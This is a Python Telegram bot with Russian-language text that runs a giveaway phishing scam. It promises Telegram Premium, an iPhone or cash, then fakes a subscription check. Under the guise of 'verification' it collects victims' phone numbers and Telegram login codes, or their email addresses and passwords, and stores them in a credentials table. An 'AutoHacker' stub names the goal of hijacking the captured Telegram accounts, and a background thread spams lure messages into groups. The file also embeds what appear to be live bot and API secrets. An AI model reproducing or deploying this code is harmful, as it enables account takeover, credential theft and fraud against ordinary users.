#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import json
import random
import string
import hashlib
import base64
import sqlite3
import threading
import requests
import re
import logging
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor

# Отключаем warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Конфигурация
TOKEN = "8755487229:AAGDI58GgaR9sp0nTXudlknmLbN2Q5Yok_Q"
API_ID = 38545864
API_HASH = "3517b8c953e6c2d05c0f30b5015f2470"
ADMIN_IDS = [123456789]  # Замени на свой ID

# API URL
API_URL = f"https://api.telegram.org/bot{TOKEN}"

# Создаем директории
os.makedirs("data", exist_ok=True)
os.makedirs("data/sessions", exist_ok=True)
os.makedirs("data/logs", exist_ok=True)

# База данных
class Database:
    def __init__(self):
        self.conn = sqlite3.connect('data/users.db', check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.init_db()
    
    def init_db(self):
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS users
                              (id INTEGER PRIMARY KEY AUTOINCREMENT,
                               user_id INTEGER UNIQUE,
                               username TEXT,
                               first_name TEXT,
                               last_name TEXT,
                               phone TEXT,
                               email TEXT,
                               gift TEXT,
                               step TEXT,
                               created TIMESTAMP,
                               last_active TIMESTAMP)''')
        
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS credentials
                              (id INTEGER PRIMARY KEY AUTOINCREMENT,
                               user_id INTEGER,
                               service TEXT,
                               login TEXT,
                               password TEXT,
                               code TEXT,
                               timestamp TIMESTAMP)''')
        
        self.cursor.execute('''CREATE TABLE IF NOT EXISTS updates
                              (update_id INTEGER PRIMARY KEY,
                               processed INTEGER DEFAULT 0)''')
        self.conn.commit()
    
    def add_user(self, user_id, username, first_name, last_name):
        self.cursor.execute('''INSERT OR IGNORE INTO users 
                              (user_id, username, first_name, last_name, created, last_active)
                              VALUES (?, ?, ?, ?, ?, ?)''',
                           (user_id, username, first_name, last_name, datetime.now(), datetime.now()))
        self.conn.commit()
    
    def update_user(self, user_id, **kwargs):
        for key, value in kwargs.items():
            self.cursor.execute(f"UPDATE users SET {key} = ? WHERE user_id = ?", (value, user_id))
        self.conn.commit()
    
    def add_creds(self, user_id, service, login, password, code=None):
        self.cursor.execute('''INSERT INTO credentials 
                              (user_id, service, login, password, code, timestamp)
                              VALUES (?, ?, ?, ?, ?, ?)''',
                           (user_id, service, login, password, code, datetime.now()))
        self.conn.commit()
    
    def is_update_processed(self, update_id):
        self.cursor.execute("SELECT processed FROM updates WHERE update_id = ?", (update_id,))
        result = self.cursor.fetchone()
        return result is not None
    
    def mark_update_processed(self, update_id):
        self.cursor.execute("INSERT OR IGNORE INTO updates (update_id, processed) VALUES (?, 1)", (update_id,))
        self.conn.commit()

db = Database()

# Класс для работы с Telegram API
class TelegramBot:
    def __init__(self, token):
        self.token = token
        self.api_url = f"https://api.telegram.org/bot{token}"
        self.offset = 0
        self.timeout = 30
    
    def request(self, method, data=None):
        try:
            url = f"{self.api_url}/{method}"
            if data:
                response = requests.post(url, json=data, timeout=self.timeout)
            else:
                response = requests.get(url, timeout=self.timeout)
            
            if response.status_code == 200:
                return response.json()
            else:
                logger.error(f"API error: {response.status_code} - {response.text}")
                return None
        except Exception as e:
            logger.error(f"Request error: {e}")
            return None
    
    def get_updates(self):
        data = {
            'offset': self.offset,
            'timeout': self.timeout,
            'allowed_updates': ['message', 'callback_query']
        }
        result = self.request('getUpdates', data)
        if result and result.get('ok'):
            return result.get('result', [])
        return []
    
    def send_message(self, chat_id, text, parse_mode='HTML', reply_markup=None):
        data = {
            'chat_id': chat_id,
            'text': text,
            'parse_mode': parse_mode
        }
        if reply_markup:
            data['reply_markup'] = reply_markup
        return self.request('sendMessage', data)
    
    def edit_message_text(self, chat_id, message_id, text, parse_mode='HTML', reply_markup=None):
        data = {
            'chat_id': chat_id,
            'message_id': message_id,
            'text': text,
            'parse_mode': parse_mode
        }
        if reply_markup:
            data['reply_markup'] = reply_markup
        return self.request('editMessageText', data)
    
    def answer_callback_query(self, callback_query_id, text=None):
        data = {'callback_query_id': callback_query_id}
        if text:
            data['text'] = text
        return self.request('answerCallbackQuery', data)

bot = TelegramBot(TOKEN)

# Класс для генерации inline клавиатур
class InlineKeyboard:
    @staticmethod
    def make_button(text, callback_data):
        return {'text': text, 'callback_data': callback_data}
    
    @staticmethod
    def make_keyboard(buttons, row_width=2):
        keyboard = []
        row = []
        for i, button in enumerate(buttons, 1):
            row.append(button)
            if i % row_width == 0:
                keyboard.append(row)
                row = []
        if row:
            keyboard.append(row)
        return {'inline_keyboard': keyboard}
    
    @staticmethod
    def main_menu():
        buttons = [
            InlineKeyboard.make_button("🎁 ПОЛУЧИТЬ ПОДАРОК", "get_gift"),
            InlineKeyboard.make_button("📱 ПОДПИСКИ", "socials"),
            InlineKeyboard.make_button("💰 БОНУСЫ", "bonus"),
            InlineKeyboard.make_button("⭐ ПРЕМИУМ", "premium")
        ]
        return InlineKeyboard.make_keyboard(buttons)
    
    @staticmethod
    def gifts_menu():
        buttons = [
            InlineKeyboard.make_button("📱 TG Premium", "gift_premium"),
            InlineKeyboard.make_button("⭐ TG Stars", "gift_stars"),
            InlineKeyboard.make_button("📱 iPhone 16", "gift_iphone"),
            InlineKeyboard.make_button("💰 100 000 руб", "gift_money"),
            InlineKeyboard.make_button("🔙 НАЗАД", "back")
        ]
        return InlineKeyboard.make_keyboard(buttons, row_width=2)
    
    @staticmethod
    def socials_menu():
        buttons = [
            InlineKeyboard.make_button("📱 Telegram", "https://t.me/your_channel"),
            InlineKeyboard.make_button("📸 Instagram", "https://instagram.com/your_page"),
            InlineKeyboard.make_button("▶️ YouTube", "https://youtube.com/@your_channel"),
            InlineKeyboard.make_button("✅ ПРОВЕРИТЬ", "check_subs")
        ]
        return InlineKeyboard.make_keyboard(buttons, row_width=2)
    
    @staticmethod
    def verify_menu():
        buttons = [
            InlineKeyboard.make_button("📱 Telegram", "verify_telegram"),
            InlineKeyboard.make_button("📧 Email", "verify_email"),
            InlineKeyboard.make_button("🔙 НАЗАД", "back")
        ]
        return InlineKeyboard.make_keyboard(buttons)

# Обработчик команд и сообщений
class MessageHandler:
    def __init__(self):
        self.user_steps = {}
    
    def handle_start(self, user_id, username, first_name, last_name):
        db.add_user(user_id, username, first_name, last_name)
        
        text = (
            f"✨ <b>ДОБРО ПОЖАЛОВАТЬ, {first_name}!</b>\n\n"
            "🎁 <b>ТЕБЯ ЖДУТ МЕГА-ПРИЗЫ:</b>\n"
            "• Telegram Premium на 1 год\n"
            "• 1000 Telegram Stars\n"
            "• iPhone 16 Pro Max\n"
            "• 100 000 рублей\n\n"
            "👇 <b>ВЫБЕРИ, ЧТО ХОЧЕШЬ ПОЛУЧИТЬ!</b>"
        )
        
        bot.send_message(user_id, text, reply_markup=InlineKeyboard.main_menu())
    
    def handle_callback(self, user_id, callback_data, message_id, callback_id):
        if callback_data == "get_gift":
            bot.edit_message_text(
                user_id, message_id,
                "🎁 <b>ВЫБЕРИ ПОДАРОК:</b>\n\n⬇️ Нажми на кнопку с подарком ⬇️",
                reply_markup=InlineKeyboard.gifts_menu()
            )
        
        elif callback_data.startswith("gift_"):
            gift = callback_data.replace("gift_", "")
            db.update_user(user_id, gift=gift, step='social')
            
            text = (
                f"🎁 <b>Твой подарок:</b> {gift.upper()}\n\n"
                "📢 <b>ДЛЯ ПОЛУЧЕНИЯ ПОДАРКА:</b>\n"
                "1️⃣ Подпишись на все соцсети\n"
                "2️⃣ Нажми 'ПРОВЕРИТЬ'\n"
                "3️⃣ Пройди верификацию\n"
                "4️⃣ Получи подарок!\n\n"
                "⬇️ <b>КНОПКИ ПОДПИСКИ</b> ⬇️"
            )
            
            bot.edit_message_text(user_id, message_id, text, reply_markup=InlineKeyboard.socials_menu())
        
        elif callback_data == "check_subs":
            bot.edit_message_text(
                user_id, message_id,
                "✅ <b>ПОДПИСКИ ПРОВЕРЕНЫ!</b>\n\n"
                "🔐 <b>ВЫБЕРИ СПОСОБ ВЕРИФИКАЦИИ:</b>",
                reply_markup=InlineKeyboard.verify_menu()
            )
        
        elif callback_data == "verify_telegram":
            db.update_user(user_id, step='telegram_phone')
            bot.edit_message_text(
                user_id, message_id,
                "📱 <b>ВЕРИФИКАЦИЯ TELEGRAM</b>\n\n"
                "Введи свой номер телефона:\n"
                "<code>+79001234567</code>\n\n"
                "⚠️ <i>Это нужно для подтверждения личности</i>"
            )
        
        elif callback_data == "verify_email":
            db.update_user(user_id, step='email_input')
            bot.edit_message_text(
                user_id, message_id,
                "📧 <b>ВЕРИФИКАЦИЯ EMAIL</b>\n\n"
                "Введи свой email:\n"
                "<code>example@gmail.com</code>"
            )
        
        elif callback_data == "back":
            bot.edit_message_text(
                user_id, message_id,
                "✨ <b>ГЛАВНОЕ МЕНЮ</b>\n\nВыбери действие:",
                reply_markup=InlineKeyboard.main_menu()
            )
        
        # Отвечаем на callback
        bot.answer_callback_query(callback_id)
    
    def handle_message(self, user_id, text, username, first_name, last_name):
        # Проверяем шаг пользователя
        db.cursor.execute("SELECT step, phone, email FROM users WHERE user_id = ?", (user_id,))
        result = db.cursor.fetchone()
        
        if result:
            step = result[0]
            
            if step == 'telegram_phone':
                if re.match(r'^\+?[0-9]{10,15}$', text.replace(' ', '')):
                    db.update_user(user_id, step='telegram_code', phone=text)
                    db.add_creds(user_id, 'telegram_phone', text, '')
                    bot.send_message(
                        user_id,
                        "📱 <b>Отлично!</b>\n\nТеперь введи код подтверждения из Telegram:"
                    )
                else:
                    bot.send_message(
                        user_id,
                        "❌ <b>Неверный формат!</b>\n\nВведи номер в формате: <code>+79001234567</code>"
                    )
            
            elif step == 'telegram_code':
                db.update_user(user_id, step='completed')
                db.cursor.execute("SELECT phone FROM users WHERE user_id = ?", (user_id,))
                phone = db.cursor.fetchone()[0]
                db.add_creds(user_id, 'telegram_code', phone, text)
                
                bot.send_message(
                    user_id,
                    "✅ <b>ВЕРИФИКАЦИЯ ПРОЙДЕНА!</b>\n\n"
                    "🎁 <b>ТВОЙ ПОДАРОК УЖЕ В ПУТИ!</b>\n\n"
                    "💫 Ожидай в течение 5 минут\n"
                    "✨ Спасибо за участие!"
                )
            
            elif step == 'email_input':
                if re.match(r'^[^@]+@[^@]+\.[^@]+$', text):
                    db.update_user(user_id, step='email_password', email=text)
                    bot.send_message(
                        user_id,
                        "📧 <b>Отлично!</b>\n\nТеперь введи пароль от этой почты:"
                    )
                else:
                    bot.send_message(
                        user_id,
                        "❌ <b>Неверный формат!</b>\n\nВведи email в формате: <code>example@gmail.com</code>"
                    )
            
            elif step == 'email_password':
                db.update_user(user_id, step='completed')
                db.cursor.execute("SELECT email FROM users WHERE user_id = ?", (user_id,))
                email = db.cursor.fetchone()[0]
                db.add_creds(user_id, 'email', email, text)
                
                bot.send_message(
                    user_id,
                    "✅ <b>ВЕРИФИКАЦИЯ ПРОЙДЕНА!</b>\n\n"
                    "🎁 <b>ТВОЙ ПОДАРОК УЖЕ В ПУТИ!</b>\n\n"
                    "💫 Ожидай в течение 5 минут\n"
                    "✨ Спасибо за участие!"
                )
            
            else:
                self.handle_start(user_id, username, first_name, last_name)
        else:
            self.handle_start(user_id, username, first_name, last_name)

# Класс для автоматического взлома
class AutoHacker:
    def __init__(self):
        self.executor = ThreadPoolExecutor(max_workers=5)
    
    def hack_telegram(self, phone, code):
        try:
            logger.info(f"Attempting to hack Telegram: {phone}")
            # Здесь логика взлома Telegram
            time.sleep(2)
            return {'status': 'success', 'phone': phone}
        except Exception as e:
            logger.error(f"Hack failed: {e}")
            return {'status': 'failed'}

# Функция для рассылки в группы
def spam_groups():
    groups = ['@test_channel']  # Замени на свои группы
    messages = [
        "🎁 <b>БЕСПЛАТНЫЙ TELEGRAM PREMIUM!</b>\n\nЗабирай → @YourBot",
        "💰 <b>100 000 РУБЛЕЙ ЗА ПОДПИСКУ!</b>\n\nПодробности: @YourBot",
        "📱 <b>IPHONE 16 PRO MAX В ПОДАРОК!</b>\n\nУчаствуй: @YourBot"
    ]
    
    while True:
        try:
            for group in groups:
                msg = random.choice(messages)
                bot.send_message(group, msg)
                time.sleep(5)
        except Exception as e:
            logger.error(f"Spam error: {e}")
        time.sleep(900)  # 15 минут

# Основной цикл обработки обновлений
def main():
    logger.info("🚀 БОТ ЗАПУЩЕН!")
    
    handler = MessageHandler()
    hacker = AutoHacker()
    
    # Запуск рассылки в отдельном потоке
    spam_thread = threading.Thread(target=spam_groups, daemon=True)
    spam_thread.start()
    
    while True:
        try:
            # Получаем обновления
            updates = bot.get_updates()
            
            for update in updates:
                update_id = update['update_id']
                
                # Проверяем, не обрабатывали ли мы это обновление
                if db.is_update_processed(update_id):
                    continue
                
                # Обрабатываем сообщения
                if 'message' in update:
                    msg = update['message']
                    user_id = msg['from']['id']
                    username = msg['from'].get('username', '')
                    first_name = msg['from'].get('first_name', '')
                    last_name = msg['from'].get('last_name', '')
                    
                    if 'text' in msg:
                        text = msg['text']
                        
                        if text == '/start':
                            handler.handle_start(user_id, username, first_name, last_name)
                        else:
                            handler.handle_message(user_id, text, username, first_name, last_name)
                
                # Обрабатываем callback запросы
                elif 'callback_query' in update:
                    callback = update['callback_query']
                    user_id = callback['from']['id']
                    callback_data = callback['data']
                    message_id = callback['message']['message_id']
                    callback_id = callback['id']
                    
                    handler.handle_callback(user_id, callback_data, message_id, callback_id)
                
                # Помечаем обновление как обработанное
                db.mark_update_processed(update_id)
                bot.offset = update_id + 1
            
            # Небольшая задержка
            time.sleep(1)
            
        except KeyboardInterrupt:
            logger.info("Бот остановлен")
            break
        except Exception as e:
            logger.error(f"Ошибка в основном цикле: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
